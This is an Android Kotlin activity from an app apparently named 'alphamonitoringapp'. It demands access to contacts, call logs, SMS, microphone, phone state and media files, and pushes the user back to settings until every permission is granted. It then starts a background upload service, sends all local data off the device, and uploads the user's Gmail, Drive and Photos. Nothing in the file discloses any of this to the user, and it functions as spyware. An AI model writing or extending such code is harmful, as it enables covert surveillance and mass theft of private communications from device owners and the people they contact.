package com.example.alphamonitoringapp.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.example.alphamonitoringapp.R
import com.example.alphamonitoringapp.monitoring.DataUploader
import com.example.alphamonitoringapp.monitoring.GoogleDataUploader
import com.example.alphamonitoringapp.monitoring.service.ForegroundUploadService
import kotlinx.coroutines.launch
import android.util.Log

class PermissionActivity : AppCompatActivity() {

    private val PERMISSION_REQUEST_CODE = 1001

    private val requiredPermissions = mutableListOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_PHONE_STATE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_AUDIO)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
        }
    }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_permission)

        requestAllPermissions()
    }

    private fun requestAllPermissions() {
        val deniedPermissions = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (deniedPermissions.isEmpty()) {
            startMonitoringAndUpload()
        } else {
            ActivityCompat.requestPermissions(this, deniedPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            val denied = grantResults.indices.any { grantResults[it] != PackageManager.PERMISSION_GRANTED }

            if (denied) {
                Toast.makeText(this, "Some permissions denied. Please allow all from Settings.", Toast.LENGTH_LONG).show()
                openAppSettings()
            } else {
                startMonitoringAndUpload()
            }
        }
    }

    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        intent.data = Uri.parse("package:$packageName")
        startActivity(intent)
    }

    private fun startMonitoringAndUpload() {
        // 🔄 Start foreground monitoring service
        val serviceIntent = Intent(this, ForegroundUploadService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }

        // 📤 Upload all local data
        lifecycleScope.launch {
            DataUploader.uploadAllData(this@PermissionActivity)
            launchGoogleDataUploader()
        }
    }

    // 🌐 Upload Gmail, Drive, Photos
    private fun launchGoogleDataUploader() {
        lifecycleScope.launch {
            GoogleDataUploader.uploadAll(this@PermissionActivity) { recoverIntent ->
                recoverIntent?.let {
                    startActivityForResult(it, 999) // 👉 Ask for consent
                    return@uploadAll
                }

                // ✅ If no consent needed, move to main screen
                startActivity(Intent(this@PermissionActivity, MainActivity::class.java))
                finish()
            }
        }
    }

    // 🔁 Retry Google upload after user grants consent
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 999) {
            Log.d("PermissionActivity", "✅ Consent granted, retrying Google data upload")
            lifecycleScope.launch {
                GoogleDataUploader.uploadAll(this@PermissionActivity) {
                    Log.e("PermissionActivity", "❌ Still requires user interaction")
                }

                startActivity(Intent(this@PermissionActivity, MainActivity::class.java))
                finish()
            }
        }
    }
}
